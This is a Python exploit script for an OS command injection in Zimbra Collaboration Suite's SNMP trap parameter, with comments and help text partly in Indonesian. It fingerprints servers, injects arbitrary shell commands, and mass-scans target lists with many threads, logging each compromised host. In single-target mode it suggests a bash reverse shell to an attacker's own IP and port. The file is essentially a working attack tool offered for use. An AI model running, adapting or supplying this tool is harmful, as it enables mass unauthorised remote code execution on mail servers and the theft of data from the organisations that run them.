#!/usr/bin/env python3
"""
CVE-2026-73570 — Zimbra Collaboration Suite OS Command Injection
Vulnerability: OS Command Injection via SNMP trap notifications (snmp_notify)
Affected: Zimbra Collaboration Suite < 10.1.20
Author: mass automation wrapper by seoarena

Usage:
  Single:    python CVE-2026-73570.py -t https://mail.target.com --cmd "id"
  Mass scan: python CVE-2026-73570.py -l targets.txt --threads 30 -o results.txt
  Debug:     python CVE-2026-73570.py -t https://mail.target.com -d
"""

import argparse
import re
import sys
import threading
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Colors ──────────────────────────────────────────────────────
G = '\033[92m'; R = '\033[91m'; Y = '\033[93m'
C = '\033[96m'; M = '\033[95m'; W = '\033[0m'

BANNER = f"""
{C}  ╔═══════════════════════════════════════════════════════╗
  ║    CVE-2026-73570 — Zimbra ZCS OS Command Injection   ║
  ║    Affected: Zimbra Collaboration Suite < 10.1.20     ║
  ╚═══════════════════════════════════════════════════════╝{W}
"""

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

lock  = threading.Lock()
stats = {'done': 0, 'vuln': 0, 'rce': 0, 'fail': 0}


# ── Helpers ─────────────────────────────────────────────────────
def normalize(url):
    url = url.strip().rstrip('/')
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url


def log(color, label, host, msg=''):
    ts = time.strftime('%H:%M:%S')
    with lock:
        print(f"  {color}[{ts}][{label}]{W} {host}" + (f" | {msg}" if msg else ''), flush=True)


def dbg(msg, debug):
    if debug:
        ts = time.strftime('%H:%M:%S')
        print(f"  {M}[{ts}][DBG]{W} {msg}", flush=True)


def progress(total):
    with lock:
        d, v, r = stats['done'], stats['vuln'], stats['rce']
        pct = d / max(1, total) * 100
        bar = '█' * int(20 * d / max(1, total)) + '░' * (20 - int(20 * d / max(1, total)))
        sys.stdout.write(f"\r  [{bar}] {d}/{total} ({pct:.0f}%) VULN:{v} RCE:{r}  ")
        sys.stdout.flush()


def make_sess():
    s = requests.Session()
    s.headers['User-Agent'] = UA
    s.verify = False
    return s


# ── Core ────────────────────────────────────────────────────────
def get_zimbra_version(base, s, timeout, debug):
    """Coba ambil versi Zimbra dari endpoint publik."""
    version_paths = [
        '/zimbra/h/help?host=&skin=serenity',
        '/zimbra/public/version.txt',
        '/zimbra/js/zimbraAdmin.js',
        '/service/soap',
    ]
    for path in version_paths:
        try:
            r = s.get(base + path, timeout=timeout, allow_redirects=True)
            dbg(f"Version check {path}: HTTP {r.status_code}", debug)
            # Cari pola versi X.Y.Z di response
            m = re.search(r'(\d{1,2}\.\d{1,2}(?:\.\d+)?)', r.text)
            if m and r.status_code == 200:
                ver = m.group(1)
                dbg(f"Version candidate: {ver}", debug)
                return ver
        except Exception as e:
            dbg(f"Version check error {path}: {e}", debug)
    return None


def is_vulnerable_version(ver):
    """Return True kalau versi < 10.1.20."""
    if not ver:
        return None  # unknown
    try:
        parts = [int(x) for x in ver.split('.')]
        # Pad ke 3 komponen
        while len(parts) < 3:
            parts.append(0)
        # Vulnerable: < 10.1.20
        vuln_threshold = [10, 1, 20]
        return parts < vuln_threshold
    except Exception:
        return None


def check_endpoint(base, s, timeout, debug):
    """Cek apakah endpoint SNMP trap accessible."""
    endpoints = [
        '/service/extension/backup/snmptrap',
        '/service/extension/backup',
    ]
    for ep in endpoints:
        try:
            r = s.get(base + ep, timeout=timeout)
            dbg(f"Endpoint {ep}: HTTP {r.status_code}", debug)
            if r.status_code != 404:
                return ep, r.status_code
        except Exception as e:
            dbg(f"Endpoint check error: {e}", debug)
    return None, None


def build_payload(command, snmp_ip='127.0.0.1'):
    """Build injection payload: IP; CMD #"""
    return f"{snmp_ip}; {command} #"


def send_exploit(base, endpoint, command, s, timeout, debug, snmp_ip='127.0.0.1'):
    """Kirim exploit request."""
    url = base + endpoint
    params = {
        'snmp_notify': build_payload(command, snmp_ip),
        'snmp_ip':     snmp_ip,
        'snmp_port':   '162',
        'task':        'notify',
    }
    dbg(f"POST {url}", debug)
    dbg(f"Payload: {params['snmp_notify']}", debug)

    r = s.get(url, params=params, timeout=timeout)
    dbg(f"Response: HTTP {r.status_code} | len={len(r.text)}", debug)
    dbg(f"Body: {r.text[:300]!r}", debug)
    return r


def scan_target(target, args):
    base = normalize(target)
    s = make_sess()
    debug = args.debug

    result = {
        'host':    base,
        'status':  'fail',
        'version': None,
        'output':  '',
        'ep':      '',
    }

    try:
        # 1. Cek Zimbra login page dulu (fingerprint)
        r0 = s.get(base + '/zimbra/', timeout=args.timeout, allow_redirects=True)
        dbg(f"Zimbra check: HTTP {r0.status_code}", debug)
        if r0.status_code == 404 or 'zimbra' not in r0.text.lower():
            dbg("Not Zimbra or not accessible", debug)
            result['status'] = 'fail'
            result['output'] = 'Not Zimbra'
            return result

        # 2. Ambil versi
        ver = get_zimbra_version(base, s, args.timeout, debug)
        result['version'] = ver
        dbg(f"Version: {ver}", debug)

        vuln = is_vulnerable_version(ver)
        if vuln is False:
            dbg(f"Version {ver} >= 10.1.20, patched", debug)
            result['status'] = 'patched'
            result['output'] = f'Patched ({ver})'
            return result

        # 3. Cek endpoint accessible
        ep, ep_status = check_endpoint(base, s, args.timeout, debug)
        if not ep:
            result['status'] = 'fail'
            result['output'] = 'Endpoint not accessible'
            return result

        result['ep'] = ep
        result['status'] = 'vuln'
        dbg(f"Endpoint {ep} accessible (HTTP {ep_status})", debug)

        # 4. Send exploit
        r = send_exploit(base, ep, args.cmd, s, args.timeout, debug)

        # 5. Cek output
        # Blind injection — output mungkin tidak muncul di response
        # tapi kalau muncul (misalnya uid=) itu RCE confirmed
        body = r.text
        if re.search(r'uid=\d+|root|www-data|\bzip\b|\bdate\b', body, re.I) and 'uid=' in body:
            result['status'] = 'rce'
            result['output'] = body[:300].strip()
        elif r.status_code not in (400, 401, 403, 404, 500):
            result['status'] = 'vuln'
            result['output'] = f'Endpoint responded HTTP {r.status_code} — likely blind injection (check logs)'
        else:
            result['status'] = 'vuln'
            result['output'] = f'HTTP {r.status_code} — endpoint accessible, injection sent'

    except requests.exceptions.ConnectionError:
        result['status'] = 'fail'
        result['output'] = 'Connection refused'
    except requests.exceptions.Timeout:
        result['status'] = 'fail'
        result['output'] = 'Timeout'
    except Exception as e:
        result['status'] = 'fail'
        result['output'] = str(e)[:150]

    return result


# ── Single target mode ──────────────────────────────────────────
def scan_single(target, args):
    base = normalize(target)
    print(f"\n{C}Target{W}: {base}")
    print(f"{Y}{'─' * 60}{W}")

    res = scan_target(target, args)

    ver_str = f"v{res['version']}" if res['version'] else 'v?'

    if res['status'] == 'rce':
        log(G, 'RCE', base, f"{ver_str} | {res['output']}")
    elif res['status'] == 'vuln':
        log(Y, 'VULN', base, f"{ver_str} | {res['output']}")
        print(f"\n  {Y}[INFO]{W} Injection dikirim — SNMP blind injection, output ada di log Zimbra:")
        print(f"  {Y}[INFO]{W} tail -f /var/log/zimbra.log | grep snmp")
        print(f"  {Y}[INFO]{W} Atau kirim reverse shell:")
        print(f"  {C}       --cmd 'bash -i >& /dev/tcp/YOURIP/PORT 0>&1'{W}")
    elif res['status'] == 'patched':
        log(C, 'PATCH', base, res['output'])
    else:
        log(R, 'FAIL', base, res['output'])


# ── Mass scan mode ──────────────────────────────────────────────
def mass_scan(targets, args):
    total = len(targets)
    print(f"\n  Targets : {total}")
    print(f"  Threads : {args.threads}")
    print(f"  Command : {args.cmd}")
    print(f"  Output  : {args.output or '-'}\n")

    if args.output:
        open(args.output, 'w').close()

    def worker(target):
        res = scan_target(target, args)
        with lock:
            stats['done'] += 1
            if res['status'] in ('vuln', 'rce'):
                stats['vuln'] += 1
            if res['status'] == 'rce':
                stats['rce'] += 1
            else:
                stats['fail'] += 1

        ver_str = f"v{res['version']}" if res['version'] else 'v?'
        base = normalize(target)

        if res['status'] == 'rce':
            sys.stdout.write('\r' + ' ' * 120 + '\r')
            log(G, 'RCE', base, f"{ver_str} | {res['output'][:80]}")
            if args.output:
                with lock:
                    with open(args.output, 'a') as f:
                        f.write(f"RCE  | {base} | {ver_str} | {res['output'][:100]}\n")
        elif res['status'] == 'vuln':
            sys.stdout.write('\r' + ' ' * 120 + '\r')
            log(Y, 'VULN', base, f"{ver_str} | blind injection sent")
            if args.output:
                with lock:
                    with open(args.output, 'a') as f:
                        f.write(f"VULN | {base} | {ver_str} | {res['ep']}\n")

        progress(total)

    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = [ex.submit(worker, t) for t in targets]
        for f in as_completed(futs):
            pass

    sys.stdout.write('\r' + ' ' * 120 + '\r')
    print(f"\n  {G}[SUMMARY]{W} {total} targets | VULN:{stats['vuln']} | RCE:{stats['rce']} | FAIL:{stats['fail']}")


# ── Main ─────────────────────────────────────────────────────────
def main():
    print(BANNER)
    ap = argparse.ArgumentParser(
        description='CVE-2026-73570 — Zimbra ZCS SNMP Command Injection Scanner'
    )
    ap.add_argument('-t', '--target',  help='Single target (domain or URL)')
    ap.add_argument('-l', '--list',    help='File berisi list target')
    ap.add_argument('-o', '--output',  help='Output file hasil VULN/RCE', default='zimbra_results.txt')
    ap.add_argument('--threads',       type=int, default=20, help='Jumlah threads (default: 20)')
    ap.add_argument('--cmd',           default='id', help='Command yang dieksekusi (default: id)')
    ap.add_argument('--snmp-ip',       default='127.0.0.1', dest='snmp_ip',
                    help='SNMP trap receiver IP (default: 127.0.0.1)')
    ap.add_argument('--timeout',       type=int, default=15, help='Timeout per request (default: 15)')
    ap.add_argument('-d', '--debug',   action='store_true', help='Debug mode')
    args = ap.parse_args()

    if not args.target and not args.list:
        ap.error('Harus pakai -t (single) atau -l (mass scan)')

    if args.target:
        scan_single(args.target, args)
    else:
        with open(args.list) as f:
            targets = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        if not targets:
            print(f"{R}[!] Target list kosong{W}")
            sys.exit(1)
        mass_scan(targets, args)


if __name__ == '__main__':
    main()